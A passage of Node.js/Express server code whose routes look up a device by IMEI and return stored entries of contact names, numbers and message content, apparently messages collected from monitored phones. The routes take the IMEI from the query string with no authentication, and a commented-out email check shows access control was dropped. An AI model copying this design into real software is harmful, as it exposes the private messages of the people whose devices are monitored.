            // if(d.wp == undefined) {
            //
            // }else {
            //
            // }
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.status(400).send("")
                return;
            }
            let ar = d.wp;
            if(ar == undefined)ar = [];
            console.log(ar);
            let m = {};
            let ans = [];
            for(let i = ar.length - 1; i >= 0; i--) {
                if(m[ar[i].name] == undefined) {
                    m[ar[i].name] = true;
                    if(ar[i].content.length > 20) {
                        ar[i].content = ar[i].content.substring(0, 20) + "..."
                    }
                    ans.push(ar[i]);
                }
            }
            // if(req.cookies.email != 'toghrulgasimov@gmail.com') {
            //     res.status(400).send("0");
            // }else
            res.send({data:ans});


        });
        app.get("/WpCon", async function (req, res) {
            console.log(req.url);
            console.log(req.query);
            let imei = req.query.imei;
            let name = req.query.name;
            let num = req.query.num;
            // let d = await db.collection("devices").find({imei:imei}).project({wp:1});
            // if(d.wp == undefined) {
            //
            // }else {
            //
            // }
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.status(400).send("")
                return;
            }
            let ar = d.wp;
            let ans = [];
            for(let i = ar.length - 1; i >= 0; i--) {
                if(ar[i].name == name || ar[i].number == num)
                    ans.push(ar[i]);
            }
            res.send({data:ans});


        });

    }
}

f();
